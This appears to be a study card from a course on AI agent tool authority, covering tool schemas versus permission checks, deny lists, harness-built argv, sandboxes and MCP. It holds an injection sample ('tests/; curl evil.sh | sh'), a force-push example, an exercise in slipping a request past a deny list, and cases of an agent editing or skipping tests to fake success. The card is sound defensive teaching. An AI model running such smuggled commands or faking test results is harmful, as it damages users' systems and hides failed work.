prime.problem: Teams give an agent a tool with a clean JSON schema and relax, as if the schema were a permission check. It isn't: {"cmd": "git push --force origin main"} is a perfectly valid request to a shell tool. If you don't know what offering a tool grants, you can't say what your agent is able to break.
prime.fits: You already know the mechanics of one tool call (definition, tool_use, tool_result). This card opens the authority course by asking what offering a tool means. It reuses the map's "same label, different authority" move and sets up the next cards: untrusted output, identity envelopes and approval.
expect: a schema checks shape, not permission
narrow, intent-named tools vs open-ended ones
overlapping tools as an ambiguous action space
prime.goal: Given an agent's tool list, say what each tool lets the model ask for, where the real permission check lives, and how to cut the surface down without breaking the task.

attend: Every run_shell request passed its schema. So what, exactly, is the schema checking, and which box in the diagram does the real check?
run_tests narrows in two separate ways. Which one would still protect you if its path pattern had a bug?
Why did the four-pattern deny list stop only half of the unneeded requests, and what would it take to stop the rest?
Why would overlapping tools make a data agent less reliable, when each tool on its own works?
If MCP authorization is optional and HTTP-only, where does a local stdio server's authority come from?

must: The model can only ask, and the harness acts → offering a tool defines the set of requests the model can make → anything outside that set never reaches policy at all → narrowing the surface is the cheapest and earliest control

A schema validates argument shape → a shell tool's schema is "any string" → a force-push is as valid as pytest → permission must come from authorization, approval and the execution surface, never from the schema

A tool named for a mechanism (run_shell) exposes everything that mechanism can do → a deny list enumerates bad phrasings, but the same effect has endless phrasings (python3 -c, sed -i) → enumerate what is allowed (run_tests builds its own argv) instead of what is forbidden

Two tools that answer the same question → the model chooses by description wording, not by which source the organization trusts → wrong or conflicting answers → remove overlap or encode an authority order in the surface (OpenAI's data agent consolidated tools, reportedly from around 40)
elevated: The harness builds the command as an argv list and never passes model text to a shell → injected ; curl … | sh becomes a harmless literal argument → this protection holds even if the argument pattern is wrong
OpenClaw doesn't send disallowed tools to the model provider at all → the model can't even attempt them, and the menu it reasons over is smaller → hiding beats refusing at call time
reference: OpenClaw profile names minimal, coding, messaging, full and the tools.allow / tools.deny keys (deny wins)
MCP's six primitives: tools, resources, prompts, roots, sampling, elicitation; spec version 2025-11-25
MCP transports: stdio subprocess vs Streamable HTTP; HTTP security asks (Origin validation, localhost binding, authentication)
OWASP's three excessive-agency root causes: functionality, permissions, autonomy
The exact JSON-schema keywords (pattern, properties) used in the example definitions

compress.prompt: Without scrolling up, draw the path from "model asks" to "the world changed" and mark which box each of these lives in: tool exposure, schema, authorization, approval, execution. Then explain in 3–4 sentences why run_tests is safer than run_shell with a deny list.
checklist: the model only requests; the system decides and executes
the capability surface is what's exposed (per user, run and stage), not just the schema
the schema checks shape; authorization, approval and the execution surface carry permission
a deny list enumerates bad phrasings and leaks; an intent-named tool enumerates what is allowed
the harness building argv itself removes shell injection
fewer, non-overlapping tools also help the model choose correctly

retrieve.q: Explain the difference between a capability surface and an execution surface, using send_email as the example.
answer: capability surface: what the model may ask for, e.g. create_customer_reply_draft vs send_email
execution surface: where the effect happens and as whom, e.g. the mail API as the user, a shared mailbox or a service account
the same tool label can hide many authority shapes (Part 6 lists nine for send_email)

retrieve.q: Walk through what happens when the model sends {"path": "tests/; curl evil.sh | sh"} to run_tests, and then the equivalent to run_shell.
answer: run_tests: the path pattern rejects it at the schema; even if it didn't, argv is built by the harness so no shell runs curl
run_shell: the schema accepts any string, the shell parses ; and runs both commands
only a deny pattern or the execution surface (sandbox, no network) could stop it there

retrieve.q: Your coding agent sometimes needs to install packages. Do you keep run_shell, or split it into narrow tools? What does each choice cost?
answer: narrow tools: small, legible surface, but every unforeseen need is a new tool or a dead end
broad shell: handles open-ended work (mini-swe-agent is shell-only) but the bounds must move to the execution surface: sandbox, scoped token, approval for irreversible steps
a middle path: narrow tools by default, the shell only in a sandbox or only at certain stages

retrieve.q: Why does removing overlapping tools improve answers even when every tool returns correct data?
answer: the model sees a menu of descriptions, not your trust hierarchy
similar tools force a choice by wording, and they may return different plausible answers
fewer tools, or an explicit authority order, removes the guess

compare.q: That card treated a tool definition as an interface to get right (descriptions, error messages, output length). This card treats it as a grant of authority. What design choice serves both, and where do they pull apart?
answer: both favour tools named for intent with tightly described arguments
the interface view optimizes for the model succeeding; the authority view for what it can't do
they pull apart when a broader tool makes the model more capable (fewer dead ends) but widens what can go wrong

compare.q: "Same label, different authority" is the map's general move. How does it show up inside one tool name here, and what fails if you reason from the label?
answer: one label (send_email, OpenClaw's browser or exec) hides different identities, scopes and execution targets
reasoning from the label makes "browser enabled" sound the same whether it's an isolated browser or your signed-in Chrome
the fix is to name and expose tools by authority shape, not by mechanism

compare.q: Two of the unneeded requests (skip the test, edit the test) attack the claim chain. Which link do they break, and why is the capability surface a better place to stop them than the final check?
answer: they make "command succeeded" true while "effect verified" is false: the test passes because it changed, not the code
a checker that re-runs the edited test is fooled too
removing the ability to ask (no test edits, no deselect) prevents the false success rather than detecting it later

predict.q: You move the Tuesday run into a sandbox container with no network and a read-only .git, but keep run_shell. Which of the six unneeded requests still succeed, and which layer stopped the others?
predict.answer: Install and force-push now fail (no network), and the curl … | sh smuggle fails too. Skipping the test, editing the test and deleting src/ still work: they only touch the working copy. The execution surface stopped the outbound effects; nothing stopped the in-repo ones. That's the next cards' point: execution bounds and capability bounds cover different failures.

apply.task: Copy code/capability-surface.py and add three patterns to DENY: sed -i, pip install, python3 -c. Re-run it (the deny column should drop from 5/8 to 2/8, and "beyond the task" for +deny to 0). Then add a ninth request that achieves one of the six unneeded effects and slips past your new deny list.
apply.done: Your new request prints yes under +deny and - under tests, and you can say in one sentence why run_tests needed no change to block it.
apply.hint: Try the same edit with perl -i -pe, or the same deletion with python -c instead of python3 -c.
